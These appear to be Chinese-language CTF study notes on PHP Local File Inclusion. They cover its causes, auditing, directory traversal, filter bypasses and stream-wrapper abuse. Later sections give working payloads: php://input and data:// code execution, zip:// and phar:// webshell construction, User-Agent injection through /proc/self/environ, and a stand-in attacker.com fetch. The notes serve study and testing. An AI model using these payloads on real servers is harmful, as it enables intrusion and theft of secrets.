# 漏洞概述

## 1.1 定义
**本地文件包含**（Local File Inclusion，简称LFI）是一种常见的Web应用程序漏洞，它允许攻击者通过<u>操纵文件路径参数</u>来<u>读取或执行Web服务器上的敏感文件</u>。与远程文件包含（RFI）不同，LFI仅涉及服务器本地的文件，这使得它在没有外部连接的环境中仍然具有危害性

- **结果**
  
    - 包含的是 PHP 文件 → 代码被执行
    - 包含的是普通文本文件 → 内容被输出（信息泄露）

**包含**指的是：Web 应用程序把指定路径的文件内容，加载到当前脚本中并解析 / 执行的行为

## 1.2 易受影响类型

- <u>内容管理系统（CMS）</u>：如WordPress、Joomla、Drupal等
- <u>自定义Web应用</u>：特别是那些使用动态文件加载功能的应用
- <u>基于模板的网站</u>：通过参数动态加载不同模板文件的网站
- <u>文档管理系统</u>：允许用户上传和查看文件的系统

## 1.3 攻击链分析

```txt
发现潜在LFI入口 → 确认漏洞存在 → 信息收集与路径探索 → 利用漏洞读取文件 → 尝试代码执行 → 权限提升 → 横向移动
```
- 首先需要识别Web应用程序中可能存在LFI漏洞的入口点，通常是<u>接受文件路径作为参数的URL</u>
- 然后通过<u>发送特制的请求</u>来确认漏洞的存在
- 接着<u>收集关于目标服务器的信息</u>，如操作系统类型、Web服务器软件、文件系统结构等，以便更有效地利用漏洞

## 1.4 LFI与RFI

|         | LFI                  | RFI                       |
| ------- | -------------------- | ------------------------- |
| 全称      | Local File Inclusion | Remote File Inclusion     |
| 包含来源    | 服务器本地文件              | 远程 URL 文件                 |
| 利用难度    | 中                    | 低（但条件更苛刻）                 |
| 依赖配置    | 无特殊要求                | 需要 `allow_url_include=On` |
| 危害      | 信息泄露 / GetShell      | 直接 GetShell               |
| 现实中出现频率 | 高                    | 低（PHP 默认关闭）               |
## 1.5 漏洞触发条件

- **存在文件包含函数**
```
include 

require 

include_once 

require_once
```
- **参数用户可控**
```
# 直接从 GET/POST 获取
include($_GET['file']);
include($_POST['page']);

# 从 Cookie 获取
include($_COOKIE['template']);
```
- **没有充分的过滤或过滤可被绕过**
```
# 看似有过滤，实则可绕过
$file = str_replace('../', '', $_GET['file']);
# 用 ....// 即可绕过
```
- **GetShell**
    - 找到可写入PHP代码的文件
    - 配合Wrapper直接执行

满足前三条即可<u>读取文件</u>，如果想要<u>RCE</u>，则需要四条全部满足

# 漏洞成因

## 2.1 危险函数

### 2.1.1 PHP

#### include | require | include_once | require_once

> **所有这四个函数在路径可被用户控制时，均可导致 LFI**

| 函数             | 是否报错                    | 是否重复包含 |     常见用途     |
| -------------- | ----------------------- | ------ | :----------: |
| `include`      | `E_WARNING`（继续执行）       | 是      |    动态页面跳转    |
| `require`      | `E_COMPILE_ERROR`（终止执行） | 是      | 必须加载的配置/函数库  |
| `include_once` | `E_WARNING`             | 否      |    防止重复引入    |
| `require_once` | `E_COMPILE_ERROR`       | 否      | 防止重复引入，强调必要性 |

```
// 危险写法（未校验 $_GET['module']）
include($_GET['module'] . '.php');

// 但若参数含恶意路径：
// ?module=../../../etc/passwd%00   → 实际包含 /etc/passwd（PHP < 5.3.4）
```

`include` 和 `require` 是 LFI 本质载体；`_once` 版本只是增加“去重”，不影响漏洞成因。

这里再补充一下`file_get_contents()`这个函数与include的区别

| 函数                            | 是否执行代码     | 是否需 `.php` 后缀 | 典型漏洞类型     | CTF 常见用途                       |
| ------------------------------- | ---------------- | ------------------ | ---------------- | ---------------------------------- |
| `include($_GET['f'])`           | 是（解析为PHP）  | 否(任意扩展名均可) | LFI(可 GetShell) | 读文件 / 包含日志 / Session        |
| `file_get_contents($_GET['f'])` | 否（纯文本输出） | 否（任意文件）     | 信息泄露(仅读)   | 读 `/etc/passwd` / 配置文件 / flag |

### 2.1.2 JSP / ASP / Python

虽然 LFI 传统上指 PHP 漏洞，但其他语言存在等价机制：

- **JSP**（Java Server Pages）
- `<jsp:include page="<%= request.getParameter('p') %>" />`
  
- `RequestDispatcher.include()`（程序化包含）
  
- `jsp:forward` / `c:import`（JSTL）若参数未过滤同样危险

```
<jsp:include page="<%= request.getParameter('view') %>" />
<!-- 攻击：?view=../WEB-INF/web.xml -->
```

- **ASP**（经典 ASP）

  - `<!--#include file="<%=Request("f")%>" -->`（SSI 包含）

  - `Server.Execute("<%=Request("f")%>")`

  - `Response.Write(Server.MapPath(...))` + 拼接 → 本地文件读取

**注意**：经典 ASP 中 `<!--#include file=` 是编译期解析，若参数动态构造，需服务端解析器允许运行时渲染；否则会直接报错。

- **Python**（常见 Web 框架）

  - **Flask**：模板渲染时若使用 `render_template(globals().get('file'))` 或自定义 loader

  - **Django**：`loader.get_template(request.GET['tpl'])`（极少见，但误用可致）

  - **原生 Python**：`exec(open(path).read())` / `exec(compile(...))` —— 这已属任意代码执行，比 LFI 更危险

> 其他语言中，**任何将用户输入拼入文件路径并触发“读取+解释执行”行为的操作，都构成 LFI 类漏洞**。只不过在 PHP 中最典型、最常见。

## 2.2 典型漏洞代码示例

### 2.2.1 ?page=

> `?page=about` → `include($_GET['page'])`

**典型漏洞形态**：

```php
<?php
$page = $_GET['page'] ?? 'home';
include($page . '.php'); // ❌ 未校验、未过滤
?>
```

**攻击演示**：

| 请求                                        | 服务器实际包含路径            | 效果                           |
| ------------------------------------------- | ----------------------------- | ------------------------------ |
| `?page=about`                               | `about.php`                   | 正常页面                       |
| `?page=../../../etc/passwd`                 | `/etc/passwd`                 | 读取系统密码文件（若权限允许） |
| `?page=../../../var/log/apache2/access.log` | `/var/log/apache2/access.log` | 日志注入前提                   |

- 若站点路径为 `/var/www/html/`，则 `../../../etc/passwd` 实际是 `../../../../etc/passwd` → 需根据深度调整 `../` 数量
- 若代码是 `include($page);`（无拼接后缀），则可直接包含任意文件名（包括 `.jpg?` 但需绕过 MIME 检查）

### 2.2.2 后缀拼接

> `include($_GET['file'] . '.php')`

**常见写法：**

```
$file = $_GET['file'] ?? 'index';
include($file . '.php'); 
// ❌ 表面限制为 .php，实则可绕过
```

**绕过方法：**

| 绕过技术           | Payload 示例                                 | 原理                                                         |
| ------------------ | -------------------------------------------- | ------------------------------------------------------------ |
| **空字节截断**     | `file=../../../../etc/passwd%00`             | PHP < 5.3.4 时，`%00` 截断 `.php` 后缀，实际载入 `/etc/passwd` |
| **路径长度截断**   | `file=../../../../../../[重复 ./ 4096 字节]` | **Linux 路径最大 4096 字节**，超长时自动截断后续内容（`.php` 被吃掉） |
| **问号截断**       | `file=../../../../etc/passwd?.php`           | 某些环境 `?` 后内容被忽略（非通用，视解析器而定）            |
| **多级目录伪绕过** | `file=../../../../etc/passwd/`               | 若服务器配置允许 `index.php` 被自动补，可能误触发（较少见）  |

大多数情况下，优先使用**%00空字节截断**和**路径长度截断**

## 2.3 相关PHP配置项

这些配置虽然放在漏洞成因这一章节里，但实际上并不直接导致LFI，但是会极大程度上影响<u>漏洞利用效果</u>和<u>绕过方式</u>。

### 2.3.1 `allow_url_include`

- **作用**：是否允许 `include/require` 加载远程 URL（如 `http://evil.com/shell.php`）
- **默认值**：**PHP 5.2+ → `Off`**
- **影响**：
  - `On` → 可直接 RFI（Remote File Inclusion），LFI 退居次要
  - `Off` → 仅能 LFI，CTF 更常见（绕过本地读写限制）

### 2.3.2 `allow_url_fopen`

- **作用**：是否允许 `fopen()` / `file_get_contents()` 等函数打开远程 URL
- **与 LFI 关系**：间接相关
  - 若开启 → 可配合 **`php://filter`** 或 **`data://`** 用 **`include()`** + **`file_get_contents()`** 组合攻击
  - 若关闭 → 部分 Wrapper（如 `phar://`）仍可用，但 `http://` 类失效

### 2.3.3 `magic_quotes_gpc`

> 影响截断

- **作用**：在 GET/POST/COOKIE 数据进入脚本前，自动对 `'`、`"`、`\`、`NULL` 加反斜杠转义
- **状态**：**PHP 5.4.0+ 已移除**；5.3.0+ 默认 `Off`
- **对 LFI 的影响**：
  - 若 `On`：可能阻止 `../` 注入？ → **否！** 因为 `.` `/` 不在转义范围内
  - 若 `On`：但可能干扰 `%00` 利用？ → 实际 **不影响**，因 `%00` 是字节，非字符
  - 真正影响的是：**单引号闭合** → 比如 `include('file=' . $_GET['f']);` 中若 `$f` 含 `'`，可能语法错误导致包含失败

> [!CAUTION]
>
> 现代PHP环境已无此配置，但在老系统（如PHP 5.2）或旧题中可能会出现

# 审计思路

## 3.1 黑盒场景：从 URL / 响应判断

### 3.1.1 参数名线索

拿到目标站点，看一下URL参数名，如果出现以下参数名，有较大的概率出现LFI漏洞

```txt
file=       page=       path=       template=
lang=       view=       module=     inc=
dir=        document=   folder=     root=
```

典型URL特征：

```
http://target.com/index.php?page=about
http://target.com/index.php?lang=en
http://target.com/index.php?template=default
http://target.com/view.php?file=readme
```

> 如果参数值看起来像<u>文件名</u>或者说<u>模块名</u>（无扩展名 / 有 `.php` / 有 `.html`），优先考虑LFI漏洞

### 3.1.2 响应分析

发送payload后

| 响应现象                                            | 含义                                         |
| --------------------------------------------------- | -------------------------------------------- |
| 正常页面 → 修改参数后页面内容变化                   | 参数影响了文件加载，高度可疑                 |
| 返回 `Warning: include(xxx): failed to open stream` | **直接确认 LFI 存在**，且暴露了服务器路径    |
| 返回 `No such file or directory`                    | 同上，路径可控                               |
| 页面输出乱码 / 二进制内容                           | 可能包含了二进制文件（如图片），说明路径可控 |
| 页面空白但状态码 200                                | 可能包含了空文件或执行了代码但无输出         |
| 页面内容与正常页面完全不同                          | 包含了其他文件，LFI 成立                     |

### 3.1.3 错误页面中的路径泄露

```txt
Warning: include(./pages/../../etc/passwd.php): 
failed to open stream: No such file or directory 
in /var/www/html/index.php on line 12
```

可以读取到的信息：

- 网站根目录：`/var/www/html/`
- 代码逻辑：`include('./pages/' . $input . '.php')`（有后缀拼接）
- 当前深度：在 `pages/` 子目录下，需要 `../../` 才能回到根目录

## 3.2 白盒场景：源码中快速定位LFI点

### 3.2.1 搜索危险函数关键词

拿到**源码**后优先查找

```bash
# 搜索包含函数
grep -rn "include\|require" --include="*.php" ./

# 搜索用户输入来源
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" --include="*.php" ./

# 组合搜索：包含函数 + 用户输入（高危）
grep -rn "include.*\$_GET\|include.*\$_POST\|require.*\$_GET" --include="*.php" ./

# 搜索文件读取函数
grep -rn "file_get_contents\|fopen\|readfile" --include="*.php" ./
```

**重点关注函数清单**

```
include()          require()
include_once()     require_once()
file_get_contents()   fopen()
readfile()         file()
highlight_file()   show_source()
```

### 3.2.2 审计路径拼接逻辑

找到危险函数后，向上追溯变量来源，判断是否可控

```php
// 情形一：直接可控，无任何过滤 → 高危
$page = $_GET['page'];
include($page);

// 情形二：有后缀拼接 → 中危，需测试截断
$page = $_GET['page'];
include('./templates/' . $page . '.php');

// 情形三：有简单过滤 → 中危，需测试绕过
$page = str_replace('../', '', $_GET['page']);
include($page);

// 情形四：有白名单 → 低危，但需确认白名单是否完整
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}
```

### 3.2.3 检查过滤逻辑是否可绕过

列举部分伪防护

| 过滤代码                                         | 绕过方式                             |
| ------------------------------------------------ | ------------------------------------ |
| `str_replace('../', '', $input)`                 | 输入 `....//` → 替换后还原为 `../`   |
| `str_replace('../', '', $input)`（递归替换缺失） | 输入 `..././` → 同理                 |
| `preg_replace('/\.\./', '', $input)`             | 输入 `..../` → 替换 `..` 后剩 `../`  |
| `strtolower($input)`                             | Windows 环境下大小写不敏感，无效防护 |
| 仅检查开头是否为 `/`                             | 用相对路径 `../` 绕过                |

## 3.3 环境探测

判断服务器 OS / PHP 版本 / 配置

### 3.3.1 通用探测：确认 LFI 是否存在

```txt
# Linux 环境探测
?page=../../../../etc/passwd
?page=../../../../etc/hosts
?page=../../../../proc/version

# Windows 环境探测
?page=../../../../windows/win.ini
?page=../../../../boot.ini
?page=C:\Windows\win.ini
```

### 3.3.2 版本线索：`%00` 是否有效 → 推断 PHP 版本

```
# 测试空字节截断
?file=../../../../etc/passwd%00

# 若成功读出 /etc/passwd → PHP < 5.3.4，%00 截断有效
# 若失败（报错或无输出）→ PHP >= 5.3.4，需换其他绕过方式
```

- `%00` 有效 → PHP 老版本，截断类 payload 全部可用
- `%00` 无效 → 需要考虑路径长度截断或 Wrapper 方案

### 3.3.3 路径风格判断 Linux / Windows

| 特征                                            | 判断    |
| ----------------------------------------------- | ------- |
| `/etc/passwd` 可读                              | Linux   |
| `C:\Windows\win.ini` 可读                       | Windows |
| 报错路径含 `\`                                  | Windows |
| 报错路径含 `/var/www/`                          | Linux   |
| 大小写不敏感（`Index.PHP` 与 `index.php` 等效） | Windows |

## 3.4 判断题目类型

### 3.4.1 纯信息泄露

- **特征**
  - 只能读文件，无法写入
  - 无日志可控、无上传点、无session可控

- **目标**
  - 读取flag / 配置文件 / 源码

```
优先使用：php://filter/convert.base64-encode/resource=flag.php
```

### 3.4.2 GETshell型

- **特征**
  - 有文件上传功能
  - 日志可读（Apache / Nginx / SSH）
  - Session内容可控
  - `allow_url_include=on`

```
利用路径：

日志注入 → 包含日志 → RCE

Session 写马 → 包含 Session → RCE

上传含 PHP 代码的文件 → LFI 包含 → RCE
```

### 3.4.3 过滤严格

- **特征**

  - 有明显过滤代码（`str_replace` / `preg_match`）

  - 直接 `../` 或者 `%00` 无效

```
思路：逐一测试绕过方式
1. 双写：....//  ..././
2. URL 编码：%2e%2e%2f
3. 双重 URL 编码：%252e%252e%252f
4. Unicode 编码（部分环境）
5. 路径长度截断
```

### 3.4.4 组合型

| 组合               | 利用思路                                   |
| ------------------ | ------------------------------------------ |
| 文件上传 + LFI     | 上传含 PHP 代码的图片 → LFI 包含该图片路径 |
| SSRF + LFI         | SSRF 探测内网 → LFI 读取内网服务配置       |
| phpinfo() + LFI    | phpinfo 泄露临时文件名 → 竞争包含临时文件  |
| 反序列化 + phar:// | 构造恶意 phar 包 → `phar://` 触发反序列化  |

## 3.5 审计流程总结

```
拿到题目
    │
    ├─ 黑盒？→ 看参数名 → 发探测 payload → 观察响应/报错
    │
    ├─ 白盒？→ grep 危险函数 → 追溯变量来源 → 分析过滤逻辑
    │
    ├─ 环境探测：OS / PHP版本 / %00是否有效
    │
    └─ 题型归类
           ├─ 纯读文件 → php://filter
           ├─ 可 GetShell → 日志/Session/上传
           ├─ 过滤严格 → 绕过技巧
           └─ 组合漏洞 → 联动其他漏洞点
```

# 基础利用

## 4.1 读取敏感文件

### 4.1.1 Linux敏感路径

| 路径                     | 作用                                          | CTF 中价值                                                   |
| ------------------------ | --------------------------------------------- | ------------------------------------------------------------ |
| **`/etc/passwd`**        | 用户账户列表（仅 uid/gid/家目录/Shell）       | 必读；确认系统用户、是否存在 `www-data` / `apache`(可读文件的身份) |
| **`/etc/shadow`**        | 密码哈希（需 root 权限；通常 LFI 无法直接读） | 一般读不到（权限限制），但若 Web 进程以 root 运行（少见），可尝试 |
| **`/etc/hosts`**         | 本地 DNS 映射                                 | 用于判断内网结构；常含 `127.0.0.1 api.dev.local` 等内部域名  |
| **`/proc/version`**      | 内核版本信息                                  | 判断 CVE 可利用性（如 Dirty COW）                            |
| **`/proc/self/environ`** | 当前进程环境变量                              | 含 `HTTP_USER_AGENT`、`REMOTE_ADDR`、有时含 DB 信息（见第7章） |

### 4.1.2 Windows敏感路径

| 路径                                    | 说明                                           |
| --------------------------------------- | ---------------------------------------------- |
| `C:\Windows\win.ini`                    | 无权限要求可读，常作为“Windows 存在”标志性文件 |
| `C:\Windows\System32\drivers\etc\hosts` | 等价于 Linux `/etc/hosts`                      |
| `C:\boot.ini`                           | 旧版 Windows 启动配置（Win XP/2003 常见）      |
| `C:\inetpub\wwwroot\config\web.config`  | ASP.NET 配置文件，含数据库连接串               |

> [!CAUTION]
>
> 若 `?f=C:\Windows\win.ini` 返回内容（非 `404` / `Permission denied`），即可确认为 Windows 系统。

### 4.1.3 Web应用配置

| 文件             | 示例路径                             | 内容风险                                  |
| ---------------- | ------------------------------------ | ----------------------------------------- |
| 数据库配置       | `/var/www/html/config/database.php`  | `host`, `username`, `password`            |
| Laravel 配置     | `.env`（根目录）                     | `DB_PASSWORD`, `APP_KEY`, `MAIL_PASSWORD` |
| WordPress 配置   | `wp-config.php`                      | `DB_NAME`, `DB_USER`, `DB_PASSWORD`       |
| 自定义 flag 文件 | `flag.txt`, `secret.txt`, `ctf_flag` | 直接出题人埋点                            |

> [!CAUTION]
>
> 若服务器禁用 `glob()` / `scandir()`，无法列目录，需靠枚举或从错误/源码中猜路径；
> 可结合 `php://filter/convert.base64-encode/resource=xxx` 安全读取含特殊字符的文件内容。

### 4.1.4 `file_get_contents()` 直接读取（非包含型信息泄露）

常见误认为安全的情况：

```php
// ❌ 危险代码（典型误判）
$path = $_GET['file'];
echo file_get_contents($path);  // 直接输出任意文件内容！
```

```php
// ❌ 带过滤但无效
$path = str_replace('../', '', $_GET['file']);  
$content = file_get_contents($path);  
echo base64_encode($content);  // 仍泄露内容！
```

破解：

- 参数受用户控制（`$_GET` / `$_POST`）
- 无白名单或强校验
- 输出了 `file_get_contents()` 的返回值
  → 即构成**高危信息泄露漏洞**。

> [!CAUTION]
>
> `file_get_contents()` **不受 `allow_url_include` 限制**（只要 `allow_url_fopen=On`，甚至能读远程 URL）
>
> ```
> ?file=http://attacker.com/shell.txt  // 若 allow_url_fopen=On，可外带数据！
> ```

## 4.2 目录穿越

### 4.2.1 `../`原理与计算

`../` = “上一级目录”   |   每个 `../` 向上回退 1 层

- **关键公式**

若当前脚本位置为： 

```
/var/www/html/modules/article/index.php
```

→ 要读 `/etc/passwd`，需：

```
../../../../../../etc/passwd
```

从 `article` → `modules` → `html` → `www` → `var` → 根 `/`，共 6 层

> [!NOTE]
>
> 1. 访问一个已知路径的图片（如 `/images/logo.png`）
> 2. 观察报错或 Burp 中请求路径 → 推断站点根目录深度
> 3. 用 `../../../../` 试穿，逐次增加，直到读到 `/etc/passwd`

### 4.2.2 绝对路径直接包含

```
include('/etc/passwd');          // 有效（若权限允许）
include('C:\\Windows\\win.ini'); // Windows 有效
```

⚠️ 常见陷阱：

- PHP 的 `include()` 在 Windows 下支持 `/` 和 `\`，但某些旧版本对 `\` 解析异常 → **推荐统一用 `/`**
- 某些 WAF 会拦截含 `../` 的请求，但对绝对路径放行 → 绝对路径是重要绕过手段

### 4.2.3 层级确定技巧

| 技巧                                      | 说明                                                         |
| ----------------------------------------- | ------------------------------------------------------------ |
| **利用错误路径泄露**                      | 如 `include(./pages/xxx)` 报错中含 `./pages/../../etc/passwd` → 直接得层数 |
| **用 `phpinfo()` 定位 `SCRIPT_FILENAME`** | `?page=php://filter/resource=phpinfo()` → 读出当前脚本绝对路径 |
| **利用 `getcwd()` + `include()` 组合**    | 若代码允许：`<?php echo getcwd(); include($_GET['f']); ?>` → 直接看到工作目录 |
| **爆破层数（0~10）**                      | 编写 Python 脚本自动试 `../../../.../etc/passwd`，响应含 `root:x:` 即命中 |

# 绕过技巧

## 5.1 后缀限制

```php
// 服务端强制拼接后缀，限制只能包含 .php 文件
include('./pages/' . $_GET['file'] . '.php');
```

**攻击目标**：

​	让最终路径变成 `./pages/../../../../etc/passwd`，而不是 `./pages/../../../../etc/passwd.php`

### 5.1.1 空字节截断

该截断在upload文件上传漏洞中曾经讲过，这里简略带过

原理：C 语言底层字符串以 `\0`（空字节）作为结束符，PHP 在调用底层文件操作时，遇到 `%00` 会截断后续内容。

```
?file=../../../../etc/passwd%00
```

服务端实际执行：

```
include('./pages/' . '../../../../etc/passwd' . '\0' . '.php');
// 底层 C 函数读到 \0 停止，.php 被丢弃
// 实际打开：./pages/../../../../etc/passwd
```

适用条件：

- PHP 版本 < 5.3.4
- `magic_quotes_gpc = Off`（若为 On，`%00` 会被转义为 `\0` 字符串，截断失效）

验证方式：

```
?file=../../../../etc/passwd%00
# 若返回 /etc/passwd 内容 → 截断成功，PHP < 5.3.4
# 若报错含 .php 后缀 → 截断失败，PHP >= 5.3.4
```

### 5.1.2 路径长度截断

| 系统    | 路径最大长度            |
| ------- | ----------------------- |
| Linux   | 4096 字节（`PATH_MAX`） |
| Windows | 256 字节（`MAX_PATH`）  |

**利用方式**:

```
?file=../../../../etc/passwd/./././././././././././././././././././././
（重复 ./ 直到总路径长度超过系统限制）
```

```
?file=../../../../etc/passwd.......................................
（大量 . 在 Linux 下等价于当前目录，不影响路径解析）
```

```
payload = "../../../../etc/passwd" + "/." * 2048
print("?file=" + payload)
# python生成payload
```

**适用条件**：

- PHP 版本 >= 5.3.4（`%00` 失效后的替代方案）
- Linux 系统（Windows 限制更短，更容易触发）
- 服务端未对路径长度做预检

### 5.1.3 `?`截断

**原理**：在部分 Web 框架或服务器配置中，`?` 被识别为 <u>URL 查询字符串起始符</u>，导致后续内容（包括拼接的 `.php`）被当作**参数**而非路径的一部分。

```
?file=../../../../etc/passwd?
# 服务端拼接后：./pages/../../../../etc/passwd?.php
# 部分环境下 ?.php 被当作 query string 丢弃
```

> [!CAUTION]
>
>  此方法依赖服务器/框架对 URL 的解析行为，不通用，需实际测试。常见于 Nginx + PHP-FPM 特定配置下

## 5.2 路径过滤

```
// 服务端过滤了 ../ 或特定字符
$file = str_replace('../', '', $_GET['file']);
include($file);
```

`str_replace`作用是替换为空

**攻击目标**：

​	让过滤后的字符串仍然包含 `../`，实现目录穿越。

### 5.2.1 URL编码

**原理**：

​	`str_replace('../', ...)` 只匹配字面字符串，不解码 URL 编码。若服务端在过滤前未做 `urldecode()`，编码后的 `../` 可绕过。

```
../   →   %2e%2e%2f
```

### 5.2.2 双重URL编码

**原理**：

​	若服务端做了一次 `urldecode()` 再过滤，可以对 `%` 本身再编码一次，使过滤时看不到 `../`，但最终经过两次解码后还原。

这个其实就是在服务器端对上一种绕过方式进行了一步防护，而我们再编码一次，绕过这个防护

```
.  →  %2e  →  %252e（% 编码为 %25）
/  →  %2f  →  %252f
```

eg:

```
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd

%252e → %2e → .
%252f → %2f → /
最终：../../etc/passwd
```

适用条件：

​	服务端对输入做了一次 `urldecode()` 后再过滤，但底层文件操作会再解码一次。

### 5.2.3大小写混淆(Windows不区分大小写)

**原理**：

​	Windows 文件系统不区分大小写，`../` 和 `..\` 等价，但过滤规则若只匹配小写，可用大写绕过

```
?file=..%5C..%5Cwindows%5Cwin.ini
# %5C = \，Windows 下等价于 /
```

或

```
?file=..\..\..\windows\win.ini
```

> [!CAUTION]
>
> 此方法仅适用于 Windows 环境，Linux 区分大小写，无效。

### 5.2.4 `....//`替换`../`的过滤

**原理**：

​	`str_replace('../', '', $input)` 只做一次替换，不递归。构造 `....//`，替换掉中间的 `../` 后，剩余字符重新拼合成 `../`

```
输入：....//
过滤：str_replace('../', '', '....//') 
      → 找到 ../ 在位置1，替换为空
      → 剩余：../    ← 还原成功！
```

eg:

```
?file=....//....//....//etc/passwd
过滤后：../../etc/passwd   ← 穿越成功
```

### 5.2.5 `..././`绕过

原理与 `....//` 类似，利用替换后字符重组：

```
输入：..././
过滤：str_replace('../', '', '..././')
      → 找到 ../ 在位置0，替换为空
      → 剩余：./    ← 不够用

# 需要多层嵌套：
输入：....\/（混合斜杠，针对 Windows）
输入：..././..././..././etc/passwd
```

更稳定的构造方式（针对递归替换缺失）：

```
?file=..././..././..././etc/passwd
# 每个 ..././ 经过一次替换后变为 ../
# 最终：../../../etc/passwd
```

## 5.3 关键词过滤

**代码特征**

```
// 过滤了特定关键词，如 etc、passwd、flag 等
if (strpos($file, 'etc') !== false || strpos($file, 'flag') !== false) {
    die('Hacker!');
}
```

### 5.3.1 双写绕过

原理跟上一种`....//替换../`是相同的原理，就不说了

```
输入：eetctc/passwd
过滤：str_replace('etc', '', 'eetctc/passwd')
      → 找到 etc 在位置2，替换为空
      → 剩余：etc/passwd   ← 还原成功！
```

| 原词     | 双写构造     |
| -------- | ------------ |
| `etc`    | `eetctc`     |
| `passwd` | `ppaasssswd` |
| `flag`   | `fflalag`    |
| `proc`   | `pprrooc`    |

### 5.3.2 编码嵌套绕过

**原理**：

​	关键词过滤在 URL 解码前执行，编码后的关键词不被识别

```
etc    →  %65%74%63
passwd →  %70%61%73%73%77%64
flag   →  %66%6c%61%67
```

eg:

```
?file=../../../../%65%74%63/%70%61%73%73%77%64
```

若服务端过滤在 `urldecode()` 之前执行，此方法有效；若过滤在解码之后，则需结合**双重编码**

## 5.5 PHP 伪协议绕过

> **核心思路**：当直接路径包含被过滤或受限时，PHP 内置的流封装协议（Stream Wrappers）可绕过限制，实现**文件读取、代码执行、Base64 编码传输**等效果。
>
> 这一块就是涉及伪协议，我已经单独整理过了，在这里结合LFI再简单说一下

------

### 5.5.1 php://filter（读取源码）

**用途**：以 Base64 编码读取任意 PHP 文件源码，绕过直接包含时 PHP 代码被执行的问题。

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=../config.php
```

**原理**：

- `php://filter` 是 PHP 内置的流过滤器
- `convert.base64-encode` 将文件内容编码为 Base64 输出，而不执行 PHP 代码
- 返回结果 Base64 解码即可得到原始源码

**常用过滤链**：

| Payload                                                      | 效果                             |
| ------------------------------------------------------------ | -------------------------------- |
| `php://filter/convert.base64-encode/resource=xxx`            | 读取文件并 Base64 编码输出       |
| `php://filter/read=string.rot13/resource=xxx`                | ROT13 编码输出（绕过关键词检测） |
| `php://filter/convert.iconv.UTF-8.UTF-16/resource=xxx`       | 字符集转换（绕过 WAF）           |
| `php://filter/zlib.deflate/convert.base64-encode/resource=xxx` | 压缩+编码（绕过长度限制）        |

------

### 5.5.2 php://input（写入代码执行）

**条件**：`allow_url_include = On`（PHP 5.2+）

**用途**：将 POST 请求体作为 PHP 代码执行，实现无文件 GetShell。

```
GET /index.php?file=php://input

POST body:
<?php system($_GET['cmd']); ?>
```

**特点**：

- 不需要写入任何文件
- POST 数据直接作为 PHP 代码执行
- `Content-Type: application/x-www-form-urlencoded` 时可能导致特殊字符被编码，建议用 raw body

------

### 5.5.3 data:// 协议（内联代码执行）

**条件**：`allow_url_include = On` + `allow_url_fopen = On`

```
# 直接执行
?file=data://text/plain,<?php system('id'); ?>

# Base64 编码（绕过关键词过滤）
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

> 💡 `PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` 是 `<?php system('id'); ?>` 的 Base64 编码

------

### 5.5.4 zip:// / phar:// 协议（压缩包包含）

**用途**：结合文件上传，将含 PHP 代码的文件压缩后上传，再通过伪协议包含执行。

**zip:// 利用**：

```
# 1. 制作压缩包（.jpg 后缀绕过上传限制）
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# 2. 包含执行
?file=zip://uploads/shell.jpg%23shell.php
# %23 = # ，指向压缩包内的 shell.php
```

**phar:// 利用**：

```
// 制作 phar 文件
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.php', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
// 重命名为 shell.jpg 上传
```

```
?file=phar://uploads/shell.jpg/shell.php
```

> ⚠️ `phar://` 还可触发**反序列化**（3.4.4 中已提及），是 CTF 高频考点。

------

### 5.5.5 协议可用性速查

| 协议           | 读文件 | 执行代码        | 需要 allow_url_include | 适用场景                 |
| -------------- | ------ | --------------- | ---------------------- | ------------------------ |
| `php://filter` | ✅      | ❌（只输出）     | ❌                      | 源码读取、信息收集       |
| `php://input`  | ❌      | ✅               | ✅                      | 无文件 GetShell          |
| `data://`      | ❌      | ✅               | ✅                      | 内联代码执行             |
| `zip://`       | ✅      | ✅               | ❌                      | 配合文件上传             |
| `phar://`      | ✅      | ✅（含反序列化） | ❌                      | 配合文件上传/反序列化    |
| `file://`      | ✅      | ✅               | ❌                      | 绝对路径读取（默认支持） |

# /proc伪文件系统利用

> [!CAUTION]
>
> **核心逻辑**：
> <u>**`/proc`** 是 Linux 内核暴露的伪文件系统</u>，存储当前进程运行时信息。对 LFI 而言，它提供了三条价值路径：**直接 GetShell（environ）、文件定位（fd/）、信息侦察（cmdline）** 

## `/proc/self/environ`环境变量注入

**原理:**

​	`/proc/self/environ` 存储当前进程（即 PHP-FPM / Apache 子进程）启动时的<u>所有环境变量</u>，其中包含 HTTP 请求头中的内容：

```
HTTP_USER_AGENT=Mozilla/5.0 ...
HTTP_HOST=victim.com
REQUEST_METHOD=GET
DOCUMENT_ROOT=/var/www/html
...
```

**关键点**：

​	**`HTTP_USER_AGENT` 的值直接来自客户端请求头，且原样写入 environ，不做任何过滤**

**利用流程:**

- **确认 `/proc/self/environ` 可读**

```txt
?file=/proc/self/environ
```

→ 若返回一堆环境变量（`HTTP_HOST=...`）→ 可利用

- **注入PHP代码到`User-Agent`**

```http
GET / HTTP/1.1
Host: victim.com
User-Agent: <?php system($_GET['cmd']); ?>
```

- **包含environ触发执行**

```
?file=/proc/self/environ&cmd=id
```

→ PHP 解析 environ 文件时，遇到 `<?php system($_GET['cmd']); ?>` 直接执行

**利用与/proc/self/cmdline**

> 结合GEEK2025 ez_read，/proc/self/environ查看环境变量，找到了`HOME=/opt/___web_very_strange_42___`，然后/proc/self/cmdline收集信息，可查看路径，看到`/app.py`，然后直接拼接起来`/opt/___web_very_strange_42___/app.py`，得到了源码

**与日志注入的对比**

| 对比项   | access.log 注入            | /proc/self/environ 注入                   |
| -------- | -------------------------- | ----------------------------------------- |
| 持久性   | 持久（日志不清则一直有效） | 仅当前请求有效（每次请求 environ 都刷新） |
| 稳定性   | 稳定                       | 稳定（只要进程存活）                      |
| 权限要求 | Web 进程可读日志           | Web 进程可读 `/proc/self/environ`         |
| 内容干扰 | 日志内容多，干扰大         | 内容精简，干扰少                          |
